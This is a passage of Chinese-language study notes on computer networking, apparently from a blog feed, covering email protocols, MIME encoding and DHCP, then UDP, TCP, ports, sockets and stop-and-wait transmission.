完全不同。</li><li>发信人的用户代理向源邮件服务器发送邮件，以及源邮件服务器向目的邮件服务器发送邮件，都是使用 SMTP 协议。</li><li>而 POP 协议或 IMAP 协议则是用户从目的邮件服务器上读取邮件所使用的协议。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_l_U_JU2Co6.png"></p><h2 id="4-4-基于万维网的电子邮件"><a href="#4-4-基于万维网的电子邮件" class="headerlink" title="4.4 基于万维网的电子邮件"></a>4.4 基于万维网的电子邮件</h2><p>用户代理 (UA) 的缺点：</p><ol><li>必须在计算机中安装用户代理软件。</li><li>收发邮件不方便。</li></ol><p>万维网电子邮件优点：</p><ol><li>不需要在计算机中再安装用户代理软件。</li><li>计算机能联网，就能非常方便地收发电子邮件。</li><li>界面非常友好。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_8CWtJeROlG.png"></p><ul><li>发送、接收电子邮件时使用 HTTP 协议。</li><li>两个邮件服务器之间传送邮件时使用 SMTP。</li></ul><p>使用 HTTP POST 方法提交要发送的邮件，使用 HTTP GET 方法读取邮件。</p><h2 id="4-5-通用互联网邮件扩充-MIME"><a href="#4-5-通用互联网邮件扩充-MIME" class="headerlink" title="4.5 通用互联网邮件扩充 MIME"></a>4.5 通用互联网邮件扩充 MIME</h2><p>SMTP 缺点：</p><ol><li>不能传送可执行文件或其他的二进制对象。</li><li>限于传送 7 位的 ASCII 码，无法传送非 ASCII 编码的信息。</li><li>服务器会拒绝超过一定长度的邮件。</li><li>某些 SMTP 的实现并没有完全按照 [RFC 821] 的 SMTP 标准。</li></ol><h3 id="4-5-1-MIME-概述"><a href="#4-5-1-MIME-概述" class="headerlink" title="4.5.1 MIME 概述"></a>4.5.1 MIME 概述</h3><p>通用互联网邮件扩充 MIME 并没有改动 SMTP 或取代它。</p><p><strong>意图</strong>：继续使用目前的 [RFC 822] 格式，但增加了邮件主体的结构，并定义了传送非 ASCII 码的编码规则。</p><p>MIME 和 SMTP 的关系：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_rRrx2IX41G.png"></p><p>MIME 主要包括三个部分</p><ol><li>5 个新的邮件首部字段。</li><li>定义了许多邮件内容的格式，对多媒体电子邮件的表示方法进行了标准化。</li><li>定义了传送编码，可对任何内容格式进行转换，而不会被邮件系统改变。</li></ol><h4 id="4-5-1-1-MIME-增加-5-个新的邮件首部-xD"><a href="#4-5-1-1-MIME-增加-5-个新的邮件首部-xD" class="headerlink" title="4.5.1.1 MIME 增加 5 个新的邮件首部&#xD;"></a>4.5.1.1 MIME 增加 5 个新的邮件首部&#xD;</h4><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_YzRBeThhZ9.png"></p><h3 id="4-5-2-内容传送编码-Content-Transfer-Encoding"><a href="#4-5-2-内容传送编码-Content-Transfer-Encoding" class="headerlink" title="4.5.2 内容传送编码(Content-Transfer-Encoding)"></a>4.5.2 内容传送编码(Content-Transfer-Encoding)</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_G1BYtOKGrP.png"></p><h4 id="4-5-2-1-Quoted-printable-编码-xD"><a href="#4-5-2-1-Quoted-printable-编码-xD" class="headerlink" title="4.5.2.1 Quoted-printable 编码&#xD;"></a>4.5.2.1 Quoted-printable 编码&#xD;</h4><ul><li>适用于所传送的数据中只有少量的非 ASCII 码的情况。</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_iG5_sXWjVm.png"></p><p>原来 1 个字节，现在需要 3 个字节，开销 &#x3D; 200%</p><h4 id="4-5-2-2-Base64-编码-xD"><a href="#4-5-2-2-Base64-编码-xD" class="headerlink" title="4.5.2.2 Base64 编码&#xD;"></a>4.5.2.2 Base64 编码&#xD;</h4><ul><li>适合任意长度的二进制数据。编码表如下：</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_GqPU9CdEcV.png"></p><p>用两个连在一起的二个等号“&#x3D;&#x3D;”和一个等号“&#x3D;”分别表示最后一组的代码只有 8 位或 16 位。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_M5Haz1ckst.png"></p><h3 id="4-5-3-内容类型"><a href="#4-5-3-内容类型" class="headerlink" title="4.5.3 内容类型"></a>4.5.3 内容类型</h3><p>MIME 标准规定：Content-Type 说明必须含有两个标识符：内容类型 (type) 和子类型 (subtype)，中间用“&#x2F;”分开。&#x20;</p><p>MIME 标准原先定义了 7 个基本内容类型和 15 种子类型。</p><p>MIME 允许发件人和收件人自己定义专用的内容类型。但为避免可能出现名字冲突，标准要求为专用内容类型选择的名字要以字符串 X-开始。</p><h4 id="4-5-3-1-MIME-Content-Type-说明中的类型及子类型-xD"><a href="#4-5-3-1-MIME-Content-Type-说明中的类型及子类型-xD" class="headerlink" title="4.5.3.1 MIME Content-Type 说明中的类型及子类型&#xD;"></a>4.5.3.1 MIME Content-Type 说明中的类型及子类型&#xD;</h4><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_ruHHhDTOvO.png"></p><p>Multipart 很有用，使邮件增加了相当大的灵活性。</p><h4 id="4-5-3-2-MIME-举例-xD"><a href="#4-5-3-2-MIME-举例-xD" class="headerlink" title="4.5.3.2 MIME 举例&#xD;"></a>4.5.3.2 MIME 举例&#xD;</h4><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_EUMtEai5to.png"></p><hr><h1 id="5-动态主机配置协议-DHCP"><a href="#5-动态主机配置协议-DHCP" class="headerlink" title="5 动态主机配置协议 DHCP"></a>5 动态主机配置协议 DHCP</h1><p>在协议软件中，给协议参数赋值的动作叫做<strong>协议配置</strong>。一个协议软件在使用之前必须是已正确配置的。具体的配置信息取决于协议栈。</p><p>连接到互联网的计算机的协议软件需要正确配置的参数包括：</p><ol><li>IP 地址</li><li>子网掩码</li><li>默认路由器的 IP 地址</li><li>域名服务器的 IP 地址</li></ol><p>动态主机配置协议 DHCP (Dynamic Host Configuration Protocol) 提供了即插即用连网 (plug-and-play networking) 的机制，允许一台计算机加入网络和获取 IP 地址，而不用手工配置。</p><p>DHCP 给运行服务器软件、且位置固定的计算机指派一个永久地址，给运行客户端软件的计算机分配一个临时地址。</p><p>需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送<strong>发现报文</strong>（DHCPDISCOVER），这时该主机就成为 DHCP 客户。</p><p>本地网络上所有主机都能收到此广播报文，但只有 DHCP 服务器才回答此广播报文。</p><p>DHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息。若找不到，则从服务器的 IP 地址池（address pool）中取一个地址分配给该计算机。DHCP服务器的回答报文叫做<strong>提供报文</strong>（DHCPOFFER）。</p><h2 id="5-1-DHCP-工作方式"><a href="#5-1-DHCP-工作方式" class="headerlink" title="5.1 DHCP 工作方式"></a>5.1 DHCP 工作方式</h2><p>DHCP 使用客户服务器方式，采用请求&#x2F;应答方式工作。</p><p>DHCP 基于 <strong>UDP</strong> 工作，DHCP 服务器运行在 <strong>67</strong> 号端口， DHCP客户运行在 <strong>68</strong> 号端口。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_nUPFqc1Saa.png"></p><p>需要 IP 地址的主机向 DHCP 服务器<strong>广播</strong>发送发现报文 (DHCPDISCOVER) 。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_g69255bUsm.png"></p><p>DHCP 服务器回答提供报文 (DHCPOFFER) （<strong>单播</strong>），提供 IP 地址等配置信息。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_ecU65SAITg.png"></p><h2 id="5-2-DHCP-中继代理-relay-agent-x20"><a href="#5-2-DHCP-中继代理-relay-agent-x20" class="headerlink" title="5.2 DHCP 中继代理 (relay agent)&#x20;"></a>5.2 DHCP 中继代理 (relay agent)&#x20;</h2><blockquote><p>问题：每个网络上都需要有 DHCP 服务器吗？</p></blockquote><ul><li>不需要，因为会使 DHCP 服务器的数量太多。</li></ul><blockquote><p>问题：若没有 DHCP 服务器，如何自动获得地址？</p></blockquote><ul><li>每一个网络至少有一个 DHCP 中继代理，它配置了 DHCP 服务器的 IP 地址信息。</li></ul><p>DHCP 中继代理以单播方式转发发现报文：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_3JI7GEEna3.png"></p><ul><li>DHCP 中继代理收到主机广播发送的发现报文后，就以单播方式向 DHCP 服务器转发此报文，并等待其回答。</li><li>收到 DHCP 服务器回答的提供报文后，DHCP 中继代理再将其发回给主机。</li></ul><h2 id="5-3-租用期-lease-period-x20"><a href="#5-3-租用期-lease-period-x20" class="headerlink" title="5.3 租用期 (lease period)&#x20;"></a>5.3 租用期 (lease period)&#x20;</h2><p>DHCP 服务器分配给 DHCP 客户的 IP 地址的临时的，因此 DHCP 客户只能在一段有限的时间内使用这个分配到的 IP 地址。DHCP 协议称这段时间为<strong>租用期</strong>。</p><p>租用期的数值应由 DHCP 服务器自己决定。</p><p>DHCP 客户也可在自己发送的报文中（例如，发现报文）提出对租用期的要求。</p><h2 id="5-4-DHCP-协议的工作过程"><a href="#5-4-DHCP-协议的工作过程" class="headerlink" title="5.4 DHCP 协议的工作过程"></a>5.4 DHCP 协议的工作过程</h2><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_JWy7jg2UfA.png"></p><ol><li>DHCP 服务器被动打开 UDP 端口 67，等待客户端发来的报文。</li><li>DHCP 客户从 UDP 端口 68 发送 DHCP 发现报文 DHCPDISCOVER。</li><li>凡收到 DHCP 发现报文的 DHCP 服务器都发出 DHCP 提供报文 DHCPOFFER，因此 DHCP 客户可能收到多个 DHCP 提供报文 。</li><li>DHCP 客户从几个 DHCP 服务器中选择其中的一个，并向所选择的 DHCP 服务器发送 DHCP 请求报文 DHCPREQUEST。</li><li>被选择的 DHCP 服务器发送确认报文 DHCPACK，DHCP 客户可开始使用得到的临时 IP 地址了，进入已绑定状态。&#x20;</li><li>DHCP 客户现在要根据服务器提供的租用期 T 设置两个计时器 T1 和 T2，它们的超时时间分别是 0.5T 和 0.875T。当超时时间到时，就要请求更新租用期。</li><li>租用期过了一半（T1 时间到），DHCP 发送请求报文 DHCPREQUEST，要求更新租用期。&#x20;</li><li>DHCP 服务器若同意，则发回确认报文 DHCPACK。DHCP 客户得到了新的租用期，重新设置计时器。</li><li>DHCP 服务器若不同意，则发回否认报 DHCPNACK。这时 DHCP 客户必须立即停止使用原来的 IP 地址，而必须重新申请 IP 地址（回到步骤2）。</li><li>若 DHCP 服务器不响应步骤 6 的请求报文 DHCPREQUEST，则在租用期过了 87.5% 时 (T2 时间到)，DHCP 客户必须重新发送请求报文 DHCPREQUEST（重复步骤 6），然后又继续后面的步骤。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络第5章：传输层</title>
      <link href="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
      <url>/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="1-传输层协议概述"><a href="#1-传输层协议概述" class="headerlink" title="1 传输层协议概述"></a>1 传输层协议概述</h1><h2 id="1-1-进程之间的通信"><a href="#1-1-进程之间的通信" class="headerlink" title="1.1 进程之间的通信"></a>1.1 进程之间的通信</h2><p>从通信和信息处理的角度看，运输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。</p><p>当网络的边缘部分中的两个主机使用网络的核心部分的功能进行端到端的通信时，只有位于网络边缘部分的主机的协议栈才有运输层，而网络核心部分中的路由器在转发分组时都只用到下三层的功能。&#x20;</p><p>运输层为相互通信的应用进程提供了逻辑通信：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_6qNRgkRCIy.png"></p><h3 id="1-1-1-应用进程之间的通信-xD"><a href="#1-1-1-应用进程之间的通信-xD" class="headerlink" title="1.1.1 应用进程之间的通信&#xD;"></a>1.1.1 应用进程之间的通信&#xD;</h3><p>两个主机进行通信实际上就是两个主机中的应用进程互相通信。&#x20;</p><p>应用进程之间的通信又称为<strong>端到端的通信</strong>。&#x20;</p><p>运输层的一个很重要的功能就是复用和分用。应用层不同进程的报文通过不同的端口向下交到运输层，再往下就共用网络层提供的服务。</p><p>“运输层提供应用进程间的逻辑通信”。“逻辑通信”的意思是：运输层之间的通信好像是沿水平方向传送数据。但事实上这两个运输层之间并没有一条水平方向的物理连接。</p><p>运输层协议和网络层协议的主要区别：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_OiMBkJAT-z.png"></p><p>在运输层有一个很重要的功能——<strong>复用和分用</strong>。</p><ul><li>复用是指发送方不同的应用进程都可以使用同一个运输层协议传送数据</li><li>分用是指接收方的运输层在剥去报文的首部后能够把这些数据正确交付目的应用进程</li></ul><h3 id="1-1-2-运输层的主要功能"><a href="#1-1-2-运输层的主要功能" class="headerlink" title="1.1.2 运输层的主要功能"></a>1.1.2 运输层的主要功能</h3><ol><li><p>运输层为应用进程之间提供端到端的逻辑通信（但网络层是为主机之间提供逻辑通信）。</p></li><li><p>运输层还要对收到的报文进行差错检测。</p></li></ol><p>运输层需要有两种不同的运输协议，即面向连接的 TCP 和无连接的 UDP。  &#x20;</p><p>运输层向高层用户屏蔽了下面网络核心的细节（如网络拓扑、所采用的路由选择协议等），它使<strong>应用进程</strong>看见的就是好像在两个运输层实体之间有一条端到端的逻辑通信信道。</p><ul><li>当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条<strong>全双工</strong>的可靠信道。</li><li>当运输层采用无连接的 UDP 协议时，这种逻辑通信信道是一条<strong>不可靠信道</strong>。&#x20;</li></ul><h2 id="1-2-运输层的两个主要协议"><a href="#1-2-运输层的两个主要协议" class="headerlink" title="1.2 运输层的两个主要协议"></a>1.2 运输层的两个主要协议</h2><p>TCP&#x2F;IP 的运输层有两个不同的协议：</p><ol><li><p>用户数据报协议 UDP  (User Datagram Protocol)</p></li><li><p>传输控制协议 TCP (Transmission Control Protocol)</p></li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_inPlz0AbMp.png"></p><p>两个对等运输实体在通信时传送的数据单位叫作运输协议数据单元 TPDU (Transport Protocol Data Unit)。</p><p>TCP 传送的数据单位协议是 TCP 报文段（segment）。</p><p>UDP 传送的数据单位协议是 UDP 报文或用户数据报。&#x20;</p><ol><li>UDP 在传送数据之前不需要先建立连接。对方的运输层在收到 UDP 报文后，不需要给出任何确认。虽然 UDP<strong>不提供可靠交付</strong>，但在某些情况下 UDP 是一种最有效的工作方式。</li><li>TCP 则提供<strong>面向连接</strong>的服务。TCP 不提供广播或多播服务。由于 TCP 要提供可靠的、面向连接的运输服务，因此不可避免地增加了许多的开销。这不仅使协议数据单元的首部增大很多，还要占用许多的处理机资源。 &#x20;</li></ol><p>运输层的 UDP 用户数据报与网际层的IP数据报有很大区别。IP 数据报要经过互连网中许多路由器的存储转发，但 UDP 用户数据报是在运输层的端到端抽象的逻辑信道中传送的。</p><p>TCP 报文段是在运输层抽象的端到端逻辑信道中传送，这种信道是可靠的全双工信道。<strong>但这样的信道却不知道究竟经过了哪些路由器，而这些路由器也根本不知道上面的运输层是否建立了 TCP 连接</strong>。&#x20;</p><h2 id="1-3-运输层的端口"><a href="#1-3-运输层的端口" class="headerlink" title="1.3 运输层的端口"></a>1.3 运输层的端口</h2><p>运行在计算机中的进程是用进程标识符来标志的。</p><p>运行在应用层的各种应用进程却不应当让计算机操作系统指派它的进程标识符。这是因为<strong>在因特网上使用的计算机的操作系统种类很多，而不同的操作系统又使用不同格式的进程标识符</strong>。</p><p>为了使运行不同操作系统的计算机的应用进程能够互相通信，就必须用统一的方法对 TCP&#x2F;IP 体系的应用进程进行标志。&#x20;</p><p>由于进程的创建和撤销都是动态的，发送方几乎无法识别其他机器上的进程。有时我们会改换接收报文的进程，但并不需要通知所有发送方。</p><p>我们往往需要利用目的主机提供的功能来识别终点，而不需要知道实现这个功能的进程是哪一个（例如，要和互联网上某个邮件服务器联系，但并不一定要知道这个服务器功能是由目的主机的哪个进程实现的）。</p><p>当应用层要发送数据时，应用进程就把数据发送到适当的端口，然后运输层从该端口读取数据，进行后续的处理（把数据发送到目的主机）。当运输层收到来自对方主机的户据时，就把数据发送到适当的端口，然后应用进程就从该端口读取数据。因此，<strong>端口必须有一定容量的缓存来暂时存放数据</strong>。</p><h3 id="1-3-1-端口号"><a href="#1-3-1-端口号" class="headerlink" title="1.3.1 端口号"></a>1.3.1 端口号</h3><p>解决这个问题的方法就是在运输层使用<strong>协议端口</strong>（protocol port number），或通常简称为端口（port）。</p><p>虽然通信的终点是应用进程，但我们可以把端口想象是通信的终点，因为我们只要把要传送的报文交到目的主机的某一个合适的目的端口，剩下的工作（即最后交付目的进程）就由 TCP 来完成。</p><p>端口用一个 16 位端口号进行标志。</p><blockquote><p>端口号只具有本地意义，即端口号只是为了标志本计算机应用层中的各进程。在因特网中不同计算机的相同端口号是没有联系的。</p></blockquote><h3 id="1-3-2-软件端口与硬件端口-xD"><a href="#1-3-2-软件端口与硬件端口-xD" class="headerlink" title="1.3.2 软件端口与硬件端口&#xD;"></a>1.3.2 软件端口与硬件端口&#xD;</h3><ul><li>在协议栈层间的抽象的协议端口是<strong>软件端口</strong>。</li><li>路由器或交换机上的端口是<strong>硬件端口</strong>。</li></ul><p>硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层的各种协议进程与运输实体进行层间交互的一种地址。&#x20;</p><h3 id="1-3-3-三类端口"><a href="#1-3-3-三类端口" class="headerlink" title="1.3.3 三类端口"></a>1.3.3 三类端口</h3><ol><li><strong>熟知端口</strong>，数值一般为 0~1023。</li><li><strong>登记端口号</strong>，数值为1024~49151，为没有熟知端口号的应用程序使用的。使用这个范围的端口号必须在 IANA 登记，以防止重复。</li><li><strong>客户端口号或短暂端口号</strong>，数值为49152~65535，留给客户进程选择暂时使用。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其他客户进程以后使用。</li></ol><hr><h1 id="2-用户数据报协议-UDP"><a href="#2-用户数据报协议-UDP" class="headerlink" title="2 用户数据报协议 UDP"></a>2 用户数据报协议 UDP</h1><h2 id="2-1-UDP-概述"><a href="#2-1-UDP-概述" class="headerlink" title="2.1 UDP 概述"></a>2.1 UDP 概述</h2><p>UDP 只在 IP 的数据报服务之上增加了很少一点的功能，即</p><ol><li>端口的功能</li><li>差错检测的功能</li></ol><p>虽然 UDP 用户数据报只能提供不可靠的交付，但 UDP 在某些方面有其特殊的优点。</p><h3 id="2-1-1-UDP-的主要特点-xD"><a href="#2-1-1-UDP-的主要特点-xD" class="headerlink" title="2.1.1 UDP 的主要特点 &#xD;"></a>2.1.1 UDP 的主要特点 &#xD;</h3><ol><li><p>UDP 是无连接的，即发送数据之前不需要建立连接，减少了开销。</p></li><li><p>UDP 使用尽最大努力交付，即不保证可靠交付，同时也不使用拥塞控制。</p></li><li><p>UDP 是面向报文的。</p><p>发送方 UDP 对应用程序交下来的报文，在添加首部后就向下交付 IP 层。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。</p><p>应用层交给 UDP 多长的报文，UDP 就照样发送，即一次发送一个报文。</p><p>接收方 UDP 对 IP 层交上来的 UDP 用户数据报，在去除首部后就原封不动地交付上层的应用进程，一次交付一个完整的报文。</p><p>应用程序必须选择合适大小的报文。</p></li><li><p>UDP 没有拥塞控制，很适合多媒体通信的要求。&#x20;</p></li><li><p>UDP 支持一对一、一对多、多对一和多对多的交互通信。</p></li><li><p>UDP 的首部开销小，只有 8 个字节。，比TCP的20字节要短。</p></li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_yHtF5AV3OY.png"></p><h2 id="2-2-UDP-的首部格式"><a href="#2-2-UDP-的首部格式" class="headerlink" title="2.2 UDP 的首部格式"></a>2.2 UDP 的首部格式</h2><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_tV8IDhobYn.png"></p><p>用户数据报 UDP 有两个字段：数据字段和首部字段。</p><p>首部字段有 8 个字节，由 4 个字段组成，每个字段都是两个字节。&#x20;</p><h3 id="2-2-1-计算-UDP-检验和"><a href="#2-2-1-计算-UDP-检验和" class="headerlink" title="2.2.1 计算 UDP 检验和"></a>2.2.1 计算 UDP 检验和</h3><p>在计算检验和时，临时把“伪首部”和 UDP 用户数据报连接在一起。伪首部仅仅是为了计算检验和。</p><p>UDP把首部和数据一起都校验，若UDP用户数据报不是偶数个字节，则要填入一个全0字节（此字节不发送）。然后按照二进制反码计算出这些16位字的和。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_jt4jhSh512.png"></p><p>不难看出，这种简单的差错检验方法的检错能力并不强，但它的好处是简单，处理起来较快。</p><hr><h1 id="3-传输控制协议-TCP"><a href="#3-传输控制协议-TCP" class="headerlink" title="3 传输控制协议 TCP"></a>3 传输控制协议 TCP</h1><h2 id="3-1-TCP-最主要的特点"><a href="#3-1-TCP-最主要的特点" class="headerlink" title="3.1 TCP 最主要的特点"></a>3.1 TCP 最主要的特点</h2><ol><li>TCP 是<strong>面向连接</strong>的运输层协议，在通信之间要先建立连接，通信之后要释放连接。</li><li>每一条 TCP 连接只能有<strong>两个端点</strong>(endpoint)，每一条 TCP 连接只能是点对点的（一对一）。&#x20;</li><li><strong>TCP 提供可靠交付的服务</strong>。通过TCP连接传送的数据，无差错、不丢失、不重复，并且按序到达。</li><li><strong>TCP 提供全双工通信</strong>。TCP允许通信双方的应用进程在任何时候都能发送数据，TCP连接的两端都设有发送缓存和接受缓存，用来临时存放双向通信的数据。</li><li><strong>面向字节流</strong>。TCP中的“流”指的是流入到进程或从进程流出的字节序列。TCP把应用进程交下来的数据仅仅看成一连串的无结构的字节流，TCP并不知道所传送的字节流的含义。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_Ayg_aFsyZ-.png"></p><p>TCP 连接是一条虚连接而不是一条真正的物理连接。</p><p>TCP 对应用进程一次把多长的报文发送到TCP 的缓存中是不关心的。TCP 根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节（UDP 发送的报文长度是应用进程给出的）。</p><p>TCP 可把太长的数据块划分短一些再传送。TCP 也可等待积累有足够多的字节后再构成报文段发送出去。&#x20;</p><h2 id="3-2-TCP-的连接"><a href="#3-2-TCP-的连接" class="headerlink" title="3.2 TCP 的连接"></a>3.2 TCP 的连接</h2><p>TCP 把连接作为最基本的抽象。每一条 TCP 连接有两个端点。</p><p>TCP 连接的端点不是主机，不是主机的IP 地址，不是应用进程，也不是运输层的协议端口。TCP 连接的端点叫做<strong>套接字(socket)<strong>或</strong>插口</strong>。</p><p>端口号拼接到(contatenated with) IP 地址即构成了套接字。  &#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_J5GivylAG2.png"></p><p>每一条 TCP 连接唯一地被通信两端的两个端点（即两个套接字）所确定。即：</p><p>$$<br>TCP 连接 ::&#x3D; {socket1, socket2}<br>             &#x3D; {(IP1: port1), (IP2: port2)}<br>$$</p><p>同一个IP地址可以有多个不同的TCP连接，而同一个端口号也可以出现在多个不同的TCP连接中。</p><h3 id="3-2-1-同一个名词-socket有多种不同的意思"><a href="#3-2-1-同一个名词-socket有多种不同的意思" class="headerlink" title="3.2.1 同一个名词 socket有多种不同的意思"></a>3.2.1 同一个名词 socket有多种不同的意思</h3><ol><li><p>应用编程接口 API 称为 socket API, 简称为 socket。</p></li><li><p>socket API 中使用的一个函数名也叫作 socket。</p></li><li><p>调用 socket 函数的端点称为 socket。</p></li><li><p>调用 socket 函数时其返回值称为 socket 描述符，可简称为 socket。</p></li><li><p>在操作系统内核中连网协议的 Berkeley 实现，称为 socket 实现。   &#x20;</p></li></ol><hr><h1 id="4-可靠传输的工作原理"><a href="#4-可靠传输的工作原理" class="headerlink" title="4 可靠传输的工作原理"></a>4 可靠传输的工作原理</h1><h2 id="4-1-停止等待协议"><a href="#4-1-停止等待协议" class="headerlink" title="4.1 停止等待协议"></a>4.1 停止等待协议</h2><p>停止等待协议就是每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。</p><h3 id="4-1-1-无差错情况"><a href="#4-1-1-无差错情况" class="headerlink" title="4.1.1 无差错情况"></a>4.1.1 无差错情况</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_-rzvaGY3Rq.png"></p><p>A只要超过了一段时间仍然没有收到确认，就认为刚才发送的分组丢失了，因为重传前面发送过的分组，这就是<strong>超时重传</strong>。因此需要设置一个超时计时器。</p><ol><li>在发送完一个分组后，发送方必须暂时保留已发送的分组的副本。</li><li>分组和确认分组都必须进行编号。</li><li>超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些。&#x20;</li></ol><h3 id="4-1-2-确认丢失和确认迟到-xD"><a href="#4-1-2-确认丢失和确认迟到-xD" class="headerlink" title="4.1.2 确认丢失和确认迟到 &#xD;"></a>4.1.2 确认丢失和确认迟到 &#xD;</h3><p><img 